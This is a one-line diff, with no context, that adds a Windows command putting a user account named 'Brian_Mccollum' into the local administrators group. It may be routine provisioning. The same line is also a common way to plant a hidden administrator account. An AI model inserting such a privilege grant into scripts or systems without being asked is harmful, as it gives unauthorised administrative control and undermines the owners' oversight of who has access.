@@ -1,0 +1,1 @@
+net localgroup "administrators" "Brian_Mccollum" /add
